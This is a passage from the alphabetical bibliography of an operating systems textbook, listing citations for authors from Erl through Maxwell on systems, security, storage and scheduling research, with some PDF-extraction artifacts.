251–266, 1995.\r\nERL, T., PUTTINI, R., and MAHMOOD, Z.: ‘‘Cloud Computing: Concepts, Technology &\r\nArchitecture,’’ Upper Saddle River, NJ: Prentice Hall, 2013.\r\nEVEN, S.: Graph Algorithms, Potomac, MD: Computer Science Press, 1979.\r\nFABRY, R.S.: ‘‘Capability-Based Addressing,’’ Commun. of the ACM, vol. 17, pp. 403–412,\r\nJuly 1974.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1049\r\nFANDRICH, M., AIKEN, M., HAWBLITZEL, C., HODSON, O., HUNT, G., LARUS, J.R., and\r\nLEVI, S.: ‘‘Language Support for Fast and Reliable Message-Based Communication in\r\nSingularity OS,’’ Proc. First European Conf. on Computer Systems (EUROSYS), ACM,\r\npp. 177–190, 2006.\r\nFEELEY, M.J., MORGAN, W.E., PIGHIN, F.H., KARLIN, A.R., LEVY, H.M., and\r\nTHEKKATH, C.A.: ‘‘Implementing Global Memory Management in a Workstation\r\nCluster,’’ Proc. 15th Symp. on Operating Systems Principles, ACM, pp. 201–212,\r\n1995.\r\nFELTEN, E.W., and HALDERMAN, J.A.: ‘‘Digital Rights Management, Spyware, and Secu\u0002rity,’’ IEEE Security and Privacy, vol. 4, pp. 18–23, Jan./Feb. 2006.\r\nFETZER, C., and KNAUTH, T.: ‘‘Energy-Aware Scheduling for Infrastructure Clouds,’’\r\nProc. Fourth Int’l Conf. on Cloud Computing Tech. and Science, IEEE, pp. 58–65,\r\n2012.\r\nFEUSTAL, E.A.: ‘‘The Rice Research Computer—A Tagged Architecture,’’ Proc. AFIPS\r\nConf., AFIPS, 1972.\r\nFLINN, J., and SATYANARAYANAN, M.: ‘‘Managing Battery Lifetime with Energy-Aware\r\nAdaptation,’’ ACM Trans. on Computer Systems, vol. 22, pp. 137–179, May 2004.\r\nFLORENCIO, D., and HERLEY, C.: ‘‘ A Large-Scale Study of Web Password Habits,’’ Proc.\r\n16th Int’l Conf. on the World Wide Web, ACM, pp. 657–666, 2007.\r\nFORD, R., and ALLEN, W.H.: ‘‘How Not To Be Seen,’’ IEEE Security and Privacy, vol. 5,\r\npp. 67–69, Jan./Feb. 2007.\r\nFOTHERINGHAM, J.: ‘‘Dynamic Storage Allocation in the Atlas Including an Automatic\r\nUse of a Backing Store,’’ Commun. of the ACM, vol. 4, pp. 435–436, Oct. 1961.\r\nFRYER, D., SUN, K., MAHMOOD, R., CHENG, T., BENJAMIN, S., GOEL, A., and DEMKE\r\nBROWN, A.: ‘‘ReCon: Verifying File System Consistency at Runtime,’’ Proc. 10th\r\nUSENIX Conf. on File and Storage Tech., USENIX, pp. 73–86, 2012.\r\nFUKSIS, R., GREITANS, M., and PUDZS, M.: ‘‘Processing of Palm Print and Blood Vessel\r\nImages for Multimodal Biometrics,’’ Proc. COST1011 European Conf. on Biometrics\r\nand ID Mgt., Springer-Verlag, pp. 238–249, 2011.\r\nFURBER, S.B., LESTER, D.R., PLANA, L.A., GARSIDE, J.D., PAINKRAS, E., TEMPLE, S.,\r\nand BROWN, A.D.: ‘‘Overview of the SpiNNaker System Architecture,’’ Tr ans. on\r\nComputers, vol. 62, pp. 2454–2467, Dec. 2013.\r\nFUSCO, J.: The Linux Programmer’s Toolbox, Upper Saddle River, NJ: Prentice Hall, 2007.\r\nGARFINKEL, T., PFAFF, B., CHOW, J., ROSENBLUM, M., and BONEH, D.: ‘‘Terra: A Vir\u0002tual Machine-Based Platform for Trusted Computing,’’ Proc. 19th Symp. on Operating\r\nSystems Principles, ACM, pp. 193–206, 2003.\r\nGAROFALAKIS, J., and STERGIOU, E.: ‘‘ An Analytical Model for the Performance Evalu\u0002ation of Multistage Interconnection Networks with Two Class Priorities,’’ Future Gen\u0002eration Computer Systems, vol. 29, pp. 114–129, Jan. 2013.\r\nGEER, D.: ‘‘For Programmers, Multicore Chips Mean Multiple Challenges,’’ Computer,\r\nvol. 40, pp. 17–19, Sept. 2007.\n1050 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nGEIST, R., and DANIEL, S.: ‘‘ A Continuum of Disk Scheduling Algorithms,’’ ACM Trans.\r\non Computer Systems, vol. 5, pp. 77–92, Feb. 1987.\r\nGELERNTER, D.: ‘‘Generative Communication in Linda,’’ ACM Trans. on Programming\r\nLanguages and Systems, vol. 7, pp. 80–112, Jan. 1985.\r\nGHOSHAL, D., and PLALE, B: ‘‘Provenance from Log Files: a BigData Problem,’’ Proc.\r\nJoint EDBT/ICDT Workshops, ACM, pp. 290–297, 2013.\r\nGIFFIN, D, LEVY, A., STEFAN, D., TEREI, D., MAZIERES, D.: ‘‘Hails: Protecting Data Pri\u0002vacy in Untrusted Web Applications,’’ Proc. 10th Symp. on Operating Systems Design\r\nand Implementation, USENIX, 2012.\r\nGIUFFRIDA, C., KUIJSTEN, A., and TANENBAUM, A.S.: ‘‘Enhanced Operating System\r\nSecurity through Efficient and Fine-Grained Address Space Randomization,’’ Proc.\r\n21st USENIX Security Symp., USENIX, 2012.\r\nGIUFFRIDA, C., KUIJSTEN, A., and TANENBAUM, A.S.: ‘‘Safe and Automatic Live\r\nUpdate for Operating Systems,’’ Proc. 18th Int’l Conf. on Arc h. Support for Prog.\r\nLang. and Operating Systems, ACM, pp. 279–292, 2013.\r\nGOLDBERG, R.P:: Architectural Principles for Virtual Computer Systems, Ph.D. thesis,\r\nHarvard University, Cambridge, MA, 1972.\r\nGOLLMAN, D.: Computer Security, West Sussex, UK: John Wiley & Sons, 2011.\r\nGONG, L.: Inside Java 2 Platform Security, Boston: Addison-Wesley, 1999.\r\nGONZALEZ-FEREZ, P., PIERNAS, J., and CORTES, T.: ‘‘DADS: Dynamic and Automatic\r\nDisk Scheduling,’’ Proc. 27th Symp. on Appl. Computing, ACM, pp. 1759–1764, 2012.\r\nGORDON, M.S., JAMSHIDI, D.A., MAHLKE, S., and MAO, Z.M.: ‘‘COMET: Code Offload\r\nby Migrating Execution Transparently,’’ Proc. 10th Symp. on Operating Systems\r\nDesign and Implementation, USENIX, 2012.\r\nGRAHAM, R.: ‘‘Use of High-Level Languages for System Programming,’’ Project MAC\r\nReport TM-13, M.I.T., Sept. 1970.\r\nGROPP, W., LUSK, E., and SKJELLUM, A.: Using MPI: Portable Parallel Programming\r\nwith the Message Passing Interface, Cambridge, MA: M.I.T. Press, 1994.\r\nGUPTA, L.: ‘‘QoS in Interconnection of Next Generation Networks,’’ Proc. Fifth Int’l Conf.\r\non Computational Intelligence and Commun. Networks, IEEE, pp. 91–96, 2013.\r\nHAERTIG, H., HOHMUTH, M., LIEDTKE, J., and SCHONBERG, S.: ‘‘The Performance of\r\nKernel-Based Systems,’’ Proc. 16th Symp. on Operating Systems Principles, ACM, pp.\r\n66–77, 1997.\r\nHAFNER, K., and MARKOFF, J.: Cyberpunk, New York: Simon and Schuster, 1991.\r\nHAITJEMA, M.A.: Delivering Consistent Network Performance in Multi-Tenant Data Cen\u0002ters, Ph.D. thesis, Washington Univ., 2013.\r\nHALDERMAN, J.A., and FELTEN, E.W.: ‘‘Lessons from the Sony CD DRM Episode,’’\r\nProc. 15th USENIX Security Symp., USENIX, pp. 77–92, 2006.\r\nHAN, S., MARSHALL, S., CHUN, B.-G., and RATNASAMY, S.: ‘‘MegaPipe: A New Pro\u0002gramming Interface for Scalable Network I/O,’’ Proc. USENIX Ann. Tech. Conf.,\r\nUSENIX, pp. 135–148, 2012.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1051\r\nHAND, S.M., WARFIELD, A., FRASER, K., KOTTSOVINOS, E., and MAGENHEIMER, D.:\r\n‘‘ Are Virtual Machine Monitors Microkernels Done Right?,’’ Proc. 10th Workshop on\r\nHot Topics in Operating Systems, USENIX, pp. 1–6, 2005.\r\nHARNIK, D., KAT, R., MARGALIT, O., SOTNIKOV, D., and TRAEGER, A.: ‘‘To Zip or Not\r\nto Zip: Effective Resource Usage for Real-Time Compression,’’ Proc. 11th USENIX\r\nConf. on File and Storage Tech., USENIX, pp. 229–241, 2013.\r\nHARRISON, M.A., RUZZO, W.L., and ULLMAN, J.D.: ‘‘Protection in Operating Systems,’’\r\nCommun. of the ACM, vol. 19, pp. 461–471, Aug. 1976.\r\nHART, J.M.: Win32 System Programming, Boston: Addison-Wesley, 1997.\r\nHARTER, T., DRAGGA, C., VAUGHN, M., ARPACI-DUSSEAU, A.C., and ARPACI\u0002DUSSEAU, R.H.: ‘‘ A File Is Not a File: Understanding the I/O Behavior of Apple\r\nDesktop Applications,’’ ACM Trans. on Computer Systems, vol. 30, Art. 10, pp. 71–83,\r\nAug. 2012.\r\nHAUSER, C., JACOBI, C., THEIMER, M., WELCH, B., and WEISER, M.: ‘‘Using Threads\r\nin Interactive Systems: A Case Study,’’ Proc. 14th Symp. on Operating Systems Princi\u0002ples, ACM, pp. 94–105, 1993.\r\nHAVENDER, J.W.: ‘‘ Avoiding Deadlock in Multitasking Systems,’’ IBM Systems J., vol. 7,\r\npp. 74–84, 1968.\r\nHEISER, G., UHLIG, V., and LEVASSEUR, J.: ‘‘ Are Virtual Machine Monitors Microker\u0002nels Done Right?’’ ACM SIGOPS Operating Systems Rev., vol. 40, pp. 95–99, 2006.\r\nHEMKUMAR, D., and VINAYKUMAR, K.: ‘‘ Aggregate TCP Congestion Management for\r\nInternet QoS,’’ Proc. 2012 Int’l Conf. on Computing Sciences, IEEE, pp. 375–378,\r\n2012.\r\nHERDER, J.N., BOS, H., GRAS, B., HOMBURG, P., and TANENBAUM, A.S.: ‘‘Construction\r\nof a Highly Dependable Operating System,’’ Proc. Sixth European Dependable Com\u0002puting Conf., pp. 3–12, 2006.\r\nHERDER, J.N., MOOLENBROEK, D. VAN, APPUSWAMY, R., WU, B., GRAS, B., and\r\nTANENBAUM, A.S.: ‘‘Dealing with Driver Failures in the Storage Stack ,’’ Proc.\r\nFourth Latin American Symp. on Dependable Computing, pp. 119–126, 2009.\r\nHEWAGE, K., and VOIGT, T.: ‘‘To wards TCP Communication with the Low Power Wire\u0002less Bus,’’ Proc. 11th Conf. on Embedded Networked Sensor Systems, ACM, Art. 53,\r\n2013.\r\nHILBRICH, T. DE SUPINSKI, R., NAGEL, W., PROTZE, J., BAIER,. C., and MULLER, M.:\r\n‘‘Distributed Wait State Tracking for Runtime MPI Deadlock Detection,’’ Proc. 2013\r\nInt’l Conf. for High Performance Computing, Networking, Storage and Analysis,\r\nACM, New York, NY, USA, 2013.\r\nHILDEBRAND, D.: ‘‘ An Architectural Overview of QNX,’’ Proc. Workshop on Microker\u0002nels and Other Kernel Arch., ACM, pp. 113–136, 1992.\r\nHIPSON, P.: Mastering Windows XP Registry, New York: Sybex, 2002.\r\nHOARE, C.A.R.: ‘‘Monitors, An Operating System Structuring Concept,’’ Commun. of the\r\nACM, vol. 17, pp. 549–557, Oct. 1974; Erratum in Commun. of the ACM, vol. 18, p.\r\n95, Feb. 1975.\n1052 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nHOCKING, M: ‘‘Feature: Thin Client Security in the Cloud,’’ J. Network Security, vol.\r\n2011, pp. 17–19, June 2011.\r\nHOHMUTH, M., PETER, M., HAERTIG, H., and SHAPIRO, J.: ‘‘Reducing TCB Size by\r\nUsing Untrusted Components: Small Kernels Versus Virtual-Machine Monitors,’’ Proc.\r\n11th ACM SIGOPS European Workshop, ACM, Art. 22, 2004.\r\nHOLMBACKA, S., AGREN, D., LAFOND, S., and LILIUS, J.: ‘‘QoS Manager for Energy\r\nEfficient Many-Core Operating Systems,’’ Proc. 21st Euromicro Int’l Conf. on Paral\u0002lel, Distributed, and Network-based Processing, IEEE, pp. 318–322, 2013.\r\nHOLT, R.C.: ‘‘Some Deadlock Properties of Computer Systems,’’ Computing Surveys, vol.\r\n4, pp. 179–196, Sept. 1972.\r\nHOQUE, M.A., SIEKKINEN, and NURMINEN, J.K.: ‘‘TCP Receive Buffer Aware Wireless\r\nMultimedia Streaming: An Energy Efficient Approach,’’ Proc. 23rd Workshop on Net\u0002work and Operating System Support for Audio and Video, ACM, pp. 13–18, 2013.\r\nHOWARD, M., and LEBLANK, D.: Writing Secure Code, Redmond, WA: Microsoft Press,\r\n2009.\r\nHRUBY, T., VOGT, D., BOS, H., and TANENBAUM, A.S.: ‘‘Keep Net Working—On a\r\nDependable and Fast Networking Stack,’’ Proc. 42nd Conf. on Dependable Systems\r\nand Networks, IEEE, pp. 1–12, 2012.\r\nHUND, R. WILLEMS, C. AND HOLZ, T.: ‘‘Practical Timing Side Channel Attacks against\r\nKernel Space ASLR,’’ Proc. IEEE Symp. on Security and Privacy, IEEE, pp. 191–205,\r\n2013.\r\nHRUBY, T., D., BOS, H., and TANENBAUM, A.S.: ‘‘When Slower Is Faster: On Heteroge\u0002neous Multicores for Reliable Systems,’’ Proc. USENIX Ann. Tech. Conf., USENIX,\r\n2013.\r\nHUA, J., LI, M., SAKURAI, K., and REN, Y.: ‘‘Efficient Intrusion Detection Based on Static\r\nAnalysis and Stack Walks,’’ Proc. Fourth Int’l Workshop on Security, Springer-Verlag,\r\npp. 158–173, 2009.\r\nHUTCHINSON, N.C., MANLEY, S., FEDERWISCH, M., HARRIS, G., HITZ, D., KLEIMAN,\r\nS., and O’MALLEY, S.: ‘‘Logical vs. Physical File System Backup,’’ Proc. Third Symp.\r\non Operating Systems Design and Implementation, USENIX, pp. 239–249, 1999.\r\nIEEE: Information Technology—Portable Operating System Interface (POSIX), Part 1: Sys\u0002tem Application Program Interface (API) [C Language], New York: Institute of Elec\u0002trical and Electronics Engineers, 1990.\r\nINTEL: ‘‘PCI-SIG SR-IOV Primer: An Introduction to SR-IOV Technology,’’ Intel White\r\nPaper, 2011.\r\nION, F.: ‘‘From Touch Displays to the Surface: A Brief History of Touchscreen Technol\u0002ogy,’’ ArsTechnica, History of Tech, April, 2013\r\nISLOOR, S.S., and MARSLAND, T.A.: ‘‘The Deadlock Problem: An Overview,’’ Computer,\r\nvol. 13, pp. 58–78, Sept. 1980.\r\nIVENS, K.: Optimizing the Windows Registry, Hoboken, NJ: John Wiley & Sons, 1998.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1053\r\nJANTZ, M.R., STRICKLAND, C., KUMAR, K., DIMITROV, M., and DOSHI, K.A.: ‘‘ A\r\nFramework for Application Guidance in Virtual Memory Systems,’’ Proc. Ninth Int’l\r\nConf. on Virtual Execution Environments, ACM, pp. 155–166, 2013.\r\nJEONG, J., KIM, H., HWANG, J., LEE, J., and MAENG, S.: ‘‘Rigorous Rental Memory\r\nManagement for Embedded Systems,’’ ACM Trans. on Embedded Computing Systems,\r\nvol. 12, Art. 43, pp. 1–21, March 2013.\r\nJIANG, X., and XU, D.: ‘‘Profiling Self-Propagating Worms via Behavioral Footprinting,’’\r\nProc. Fourth ACM Workshop in Recurring Malcode, ACM, pp. 17–24, 2006.\r\nJIN, H., LING, X., IBRAHIM, S., CAO, W., WU, S., and ANTONIU, G.: ‘‘Flubber: Two-Level\r\nDisk Scheduling in Virtualized Environment,’’ Future Generation Computer Systems,\r\nvol. 29, pp. 2222–2238, Oct. 2013.\r\nJOHNSON, E.A: ‘‘Touch Display—A Novel Input/Output Device for Computers,’’ Elec\u0002tronics Letters, vol. 1, no. 8, pp. 219–220, 1965.\r\nJOHNSON, N.F., and JAJODIA, S.: ‘‘Exploring Steganography: Seeing the Unseen,’’ Com\u0002puter, vol. 31, pp. 26–34, Feb. 1998.\r\nJOO, Y.: ‘‘F2FS: A New File System Designed for Flash Storage in Mobile Devices,’’\r\nEmbedded Linux Europe, Barcelona, Spain, November 2012.\r\nJULA, H., TOZUN, P., and CANDEA, G.: ‘‘Communix: A Framework for Collaborative\r\nDeadlock Immunity,’’ Proc. IEEE/IFIP 41st Int. Conf. on Dependable Systems and\r\nNetworks, IEEE, pp. 181–188, 2011.\r\nKABRI, K., and SERET, D.: ‘‘ An Evaluation of the Cost and Energy Consumption of Secu\u0002rity Protocols in WSNs,’’ Proc. Third Int’l Conf. on Sensor Tech. and Applications,\r\nIEEE, pp. 49–54, 2009.\r\nKAMAN, S., SWETHA, K., AKRAM, S., and VARAPRASAS, G.: ‘‘Remote User Authentica\u0002tion Using a Voice Authentication System,’’ Inf. Security J., vol. 22, pp. 117–125, Issue\r\n3, 2013.\r\nKAMINSKY, D.: ‘‘Explorations in Namespace: White-Hat Hacking across the Domain\r\nName System,’’ Commun. of the ACM, vol. 49, pp. 62–69, June 2006.\r\nKAMINSKY, M., SAVVIDES, G., MAZIERES, D., and KAASHOEK, M.F.: ‘‘Decentralized\r\nUser Authentication in a Global File System,’’ Proc. 19th Symp. on Operating Systems\r\nPrinciples, ACM, pp. 60–73, 2003.\r\nKANETKAR, Y.P.: Writing Windows Device Drivers Course Notes, New Delhi: BPB Publi\u0002cations, 2008.\r\nKANT, K., and MOHAPATRA, P.: ‘‘Internet Data Centers,’’ IEEE Computer vol. 37, pp.\r\n35–37, Nov. 2004.\r\nKAPRITSOS, M., WANG, Y., QUEMA, V., CLEMENT, A., ALVISI, L., and DAHLIN, M.:\r\n‘‘ All about Eve: Execute-Verify Replication for Multi-Core Servers,’’ Proc. 10th Symp.\r\non Operating Systems Design and Implementation, USENIX, pp. 237–250, 2012.\r\nKASIKCI, B., ZAMFIR, C. and CANDEA, G.: ‘‘Data Races vs. Data Race Bugs: Telling the\r\nDifference with Portend,’’ Proc. 17th Int’l Conf. on Arc h. Support for Prog. Lang. and\r\nOperating Systems, ACM, pp. 185–198, 2012.\n1054 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nKATO, S., ISHIKAWA, Y., and RAJKUMAR, R.: ‘‘Memory Management for Interactive\r\nReal-Time Applications,’’ Real-Time Systems, vol. 47, pp. 498–517, May 2011.\r\nKAUFMAN, C., PERLMAN, R., and SPECINER, M.: Network Security, 2nd ed., Upper Sad\u0002dle River, NJ: Prentice Hall, 2002.\r\nKELEHER, P., COX, A., DWARKADAS, S., and ZWAENEPOEL, W.: ‘‘TreadMarks: Dis\u0002tributed Shared Memory on Standard Workstations and Operating Systems,’’ Proc.\r\nUSENIX Winter Conf., USENIX, pp. 115–132, 1994.\r\nKERNIGHAN, B.W., and PIKE, R.: The UNIX Programming Environment, Upper Saddle\r\nRiver, NJ: Prentice Hall, 1984.\r\nKIM, J., LEE, J., CHOI, J., LEE, D., and NOH, S.H.: ‘‘Improving SSD Reliability with\r\nRAID via Elastic Striping and Anywhere Parity,’’ Proc. 43rd Int’l Conf. on Depend\u0002able Systems and Networks, IEEE, pp. 1–12, 2013.\r\nKIRSCH, C.M., SANVIDO, M.A.A., and HENZINGER, T.A.: ‘‘ A Programmable Microkernel\r\nfor Real-Time Systems,’’ Proc. First Int’l Conf. on Virtual Execution Environments,\r\nACM, pp. 35–45, 2005.\r\nKLEIMAN, S.R.: ‘‘Vnodes: An Architecture for Multiple File System Types in Sun UNIX,’’\r\nProc. USENIX Summer Conf., USENIX, pp. 238–247, 1986.\r\nKLEIN, G., ELPHINSTONE, K., HEISER, G., ANDRONICK, J., COCK, D., DERRIN, P.,\r\nELKADUWE, D., ENGELHARDT, K., KOLANSKI, R., NORRISH, M., SEWELL, T.,\r\nTUCH, H., and WINWOOD, S.: ‘‘seL4: Formal Verification of an OS Kernel,’’ Proc.\r\n22nd Symp. on Operating Systems Primciples, ACM, pp. 207–220, 2009.\r\nKNUTH, D.E.: The Art of Computer Programming, Vol. Boston: Addison-Wesley, 1997.\r\nKOLLER, R., MARMOL, L., RANGASWAMI, R, SUNDARARAMAN, S., TALAGALA, N.,\r\nand ZHAO, M.: ‘‘Write Policies for Host-side Flash Caches,’’ Proc. 11th USENIX\r\nConf. on File and Storage Tech., USENIX, pp. 45–58, 2013.\r\nKOUFATY, D., REDDY, D., and HAHN, S.: ‘‘Bias Scheduling in Heterogeneous Multi-Core\r\nArchitectures,’’ Proc. Fifth European Conf. on Computer Systems (EUROSYS), ACM,\r\npp. 125–138, 2010.\r\nKRATZER, C., DITTMANN, J., LANG, A., and KUHNE, T.: ‘‘WLAN Steganography: A\r\nFirst Practical Review,’’ Proc. Eighth Workshop on Multimedia and Security, ACM,\r\npp. 17–22, 2006.\r\nKRAVETS, R., and KRISHNAN, P.: ‘‘Power Management Techniques for Mobile Communi\u0002cation,’’ Proc. Fourth ACM/IEEE Int’l Conf. on Mobile Computing and Networking,\r\nACM/IEEE, pp. 157–168, 1998.\r\nKRISH, K.R., WANG, G., BHATTACHARJEE, P., BUTT, A.R., and SNIADY, C.: ‘‘On Reduc\u0002ing Energy Management Delays in Disks,’’ J. Parallel and Distributed Computing, vol.\r\n73, pp. 823–835, June 2013.\r\nKRUEGER, P., LAI, T.-H., and DIXIT-RADIYA, V.A.: ‘‘Job Scheduling Is More Important\r\nThan Processor Allocation for Hypercube Computers,’’ IEEE Trans. on Parallel and\r\nDistr. Systems, vol. 5, pp. 488–497, May 1994.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1055\r\nKUMAR, R., TULLSEN, D.M., JOUPPI, N.P., and RANGANATHAN, P.: ‘‘Heterogeneous\r\nChip Multiprocessors,’’ Computer, vol. 38, pp. 32–38, Nov. 2005.\r\nKUMAR, V.P., and REDDY, S.M.: ‘‘ Augmented Shuffle-Exchange Multistage Interconnec\u0002tion Networks,’’ Computer, vol. 20, pp. 30–40, June 1987.\r\nKWOK, Y.-K., AHMAD, I.: ‘‘Static Scheduling Algorithms for Allocating Directed Task\r\nGraphs to Multiprocessors,’’ Computing Surveys, vol. 31, pp. 406–471, Dec. 1999.\r\nLACHAIZE, R., LEPERS, B., and QUEMA, V.: ‘‘MemProf: A Memory Profiler for NUMA\r\nMulticore Systems,’’ Proc. USENIX Ann. Tech. Conf., USENIX, 2012.\r\nLAI, W.K., and TANG, C.-L.: ‘‘QoS-aware Downlink Packet Scheduling for LTE Net\u0002works,’’ Computer Networks, vol. 57, pp. 1689–1698, May 2013.\r\nLAMPSON, B.W.: ‘‘ A Note on the Confinement Problem,’’ Commun. of the ACM, vol. 10,\r\npp. 613–615, Oct. 1973.\r\nLAMPORT, L.: ‘‘Password Authentication with Insecure Communication,’’ Commun. of the\r\nACM, vol. 24, pp. 770–772, Nov. 1981.\r\nLAMPSON, B.W.: ‘‘Hints for Computer System Design,’’ IEEE Software, vol. 1, pp. 11–28,\r\nJan. 1984.\r\nLAMPSON, B.W., and STURGIS, H.E.: ‘‘Crash Recovery in a Distributed Data Storage Sys\u0002tem,’’ Xerox Palo Alto Research Center Technical Report, June 1979.\r\nLANDWEHR, C.E.: ‘‘Formal Models of Computer Security,’’ Computing Surveys, vol. 13,\r\npp. 247–278, Sept. 1981.\r\nLANKES, S., REBLE, P., SINNEN, O., and CLAUSS, C.: ‘‘Revisiting Shared Virtual Memory\r\nSystems for Non-Coherent Memory-Coupled Cores,’’ Proc. 2012 Int’l Workshop on\r\nProgramming Models for Applications for Multicores and Manycores, ACM, pp.\r\n45–54, 2012.\r\nLEE, Y., JUNG, T., and SHIN, I.L ‘‘Demand-Based Flash Translation Layer Considering\r\nSpatial Locality,’’ Proc. 28th Annual Symp. on Applied Computing, ACM, pp.\r\n1550–1551, 2013.\r\nLEVENTHAL, A.D.: ‘‘ A File System All Its Own,’’ Commun. of the ACM, vol. 56, pp.\r\n64–67, May 2013.\r\nLEVIN, R., COHEN, E.S., CORWIN, W.M., POLLACK, F.J., and WULF, W.A.: ‘‘Pol\u0002icy/Mechanism Separation in Hydra,’’ Proc. Fifth Symp. on Operating Systems Princi\u0002ples, ACM, pp. 132–140, 1975.\r\nLEVINE, G.N.: ‘‘Defining Deadlock,’’ ACM SIGOPS Operating Systems Rev., vol. 37, pp.\r\n54–64, Jan. 2003.\r\nLEVINE, J.G., GRIZZARD, J.B., and OWEN, H.L.: ‘‘Detecting and Categorizing Kernel\u0002Level Rootkits to Aid Future Detection,’’ IEEE Security and Privacy, vol. 4, pp.\r\n24–32, Jan./Feb. 2006.\r\nLI, D., JIN, H., LIAO, X., ZHANG, Y., and ZHOU, B.: ‘‘Improving Disk I/O Performance in a\r\nVirtualized System,’’ J. Computer and Syst. Sci., vol. 79, pp. 187–200, March 2013a.\n1056 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nLI, D., LIAO, X., JIN, H., ZHOU, B., and ZHANG, Q.: ‘‘ A New Disk I/O Model of Virtual\u0002ized Cloud Environment,’’ IEEE Trans. on Parallel and Distributed Systems, vol. 24,\r\npp. 1129–1138, June 2013b.\r\nLI, K.: Shared Virtual Memory on Loosely Coupled Multiprocessors, Ph.D. Thesis, Yale\r\nUniv., 1986.\r\nLI, K., and HUDAK, P.: ‘‘Memory Coherence in Shared Virtual Memory Systems,’’ ACM\r\nTr ans. on Computer Systems, vol. 7, pp. 321–359, Nov. 1989.\r\nLI, K., KUMPF, R., HORTON, P., and ANDERSON, T.: ‘‘ A Quantitative Analysis of Disk\r\nDrive Power Management in Portable Computers,’’ Proc. USENIX Winter Conf.,\r\nUSENIX, pp. 279–291, 1994.\r\nLI, Y., SHOTRE, S., OHARA, Y., KROEGER, T.M., MILLER, E.L., and LONG, D.D.E.:\r\n‘‘Horus: Fine-Grained Encryption-Based Security for Large-Scale Storage,’’ Proc. 11th\r\nUSENIX Conf. on File and Storage Tech., USENIX, pp. 147–160, 2013c.\r\nLIEDTKE, J.: ‘‘Improving IPC by Kernel Design,’’ Proc. 14th Symp. on Operating Systems\r\nPrinciples, ACM, pp. 175–188, 1993.\r\nLIEDTKE, J.: ‘‘On Micro-Kernel Construction,’’ Proc. 15th Symp. on Operating Systems\r\nPrinciples, ACM, pp. 237–250, 1995.\r\nLIEDTKE, J.: ‘‘To ward Real Microkernels,’’ Commun. of the ACM, vol. 39, pp. 70–77,\r\nSept. 1996.\r\nLING, X., JIN, H., IBRAHIM, S., CAO, W., and WU, S.: ‘‘Efficient Disk I/O Scheduling with\r\nQoS Guarantee for Xen-based Hosting Platforms,’’ Proc. 12th Int’l Symp. on Cluster,\r\nCloud, and Grid Computing, IEEE/ACM, pp. 81–89, 2012.\r\nLIONS, J.: Lions’ Commentary on Unix 6th Edition, with Source Code, San Jose, CA: Peer\u0002to-Peer Communications, 1996.\r\nLIU, T., CURTSINGER, C., and BERGER, E.D.: ‘‘Dthreads: Efficient Deterministic Multi\u0002threading,’’ Proc. 23rd Symp. of Operating Systems Principles, ACM, pp. 327–336,\r\n2011.\r\nLIU, Y., MUPPALA, J.K., VEERARAGHAVAN, M., LIN, D., and HAMDI, M.: Data Center\r\nNetworks: Topologies, Architectures and Fault-Tolerance Characteristics, Springer,\r\n2013.\r\nLO, V.M.: ‘‘Heuristic Algorithms for Task Assignment in Distributed Systems,’’ Proc.\r\nFourth Int’l Conf. on Distributed Computing Systems, IEEE, pp. 30–39, 1984.\r\nLORCH, J.R., PARNO, B., MICKENS, J., RAYKOVA, M., and SCHIFFMAN, J.: ‘‘Shroud:\r\nEnsuring Private Access to Large-Scale Data in the Data Center,’’ Proc. 11th USENIX\r\nConf. on File and Storage Tech., USENIX, pp. 199–213, 2013.\r\nLOPEZ-ORTIZ, A., SALINGER, A.: ‘‘Paging for Multi-Core Shared Caches,’’ Proc. Inno\u0002vations in Theoretical Computer Science, ACM, pp. 113–127, 2012.\r\nLORCH, J.R., and SMITH, A.J.: ‘‘ Apple Macintosh’s Energy Consumption,’’ IEEE Micro,\r\nvol. 18, pp. 54–63, Nov./Dec. 1998.\r\nLOVE, R.: Linux System Programming: Talking Directly to the Kernel and C Library,\r\nSebastopol, CA: O’Reilly & Associates, 2013.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1057\r\nLU, L., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU, R.H.: ‘‘Fault Isolation and Quick\r\nRecovery in Isolation File Systems,’’ Proc. Fifth USENIX Workshop on Hot Topics in\r\nStorage and File Systems, USENIX, 2013.\r\nLUDWIG, M.A.: The Little Black Book of Email Viruses, Show Low, AZ: American Eagle\r\nPublications, 2002.\r\nLUO, T., MA, S., LEE, R., ZHANG, X., LIU, D., and ZHOU, L.: ‘‘S-CAVE: Effective SSD\r\nCaching to Improve Virtual Machine Storage Performance,’’ Proc. 22nd Int’l Conf. on\r\nParallel Arch. and Compilation Tech., IEEE, pp. 103–112, 2013.\r\nMA, A., DRAGGA, C., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU, R.H.: ‘‘ffsck: The\r\nFast File System Checker,’’ Proc. 11th USENIX Conf. on File and Storage Tech.,\r\nUSENIX, 2013.\r\nMAO, W.: ‘‘The Role and Effectiveness of Cryptography in Network Virtualization: A Posi\u0002tion Paper,’’ Proc. Eighth ACM Asian SIGACT Symp. on Information, Computer, and\r\nCommun. Security, ACM, pp. 179–182, 2013.\r\nMARINO, D., HAMMER, C., DOLBY, J., VAZIRI, M., TIP, F., and VITEK, J.: ‘‘Detecting\r\nDeadlock in Programs with Data-Centric Synchronization,’’ Proc. Int’l Conf. on Soft\u0002ware Engineering, IEEE, pp. 322–331, 2013.\r\nMARSH, B.D., SCOTT, M.L., LEBLANC, T.J., and MARKATOS, E.P.: ‘‘First-Class User\u0002Level Threads,’’ Proc. 13th Symp. on Operating Systems Principles, ACM, pp.\r\n110–121, 1991.\r\nMASHTIZADEH, A.J., BITTAY , A., HUANG, Y.F., and MAZIERES, D.: ‘‘Replication, His\u0002tory, and Grafting in the Ori File System,’’ Proc. 24th Symp. on Operating System\r\nPrinciples, ACM, pp. 151–166, 2013.\r\nMATTHUR, A., and MUNDUR, P.: ‘‘Dynamic Load Balancing Across Mirrored Multimedia\r\nServers,’’ Proc. 2003 Int’l Conf. on Multimedia, IEEE, pp. 53–56, 2003.\r\nMAXWELL, S.: Linux Core Kernel Commentary, Scottsdale, AZ: Coriolis Group 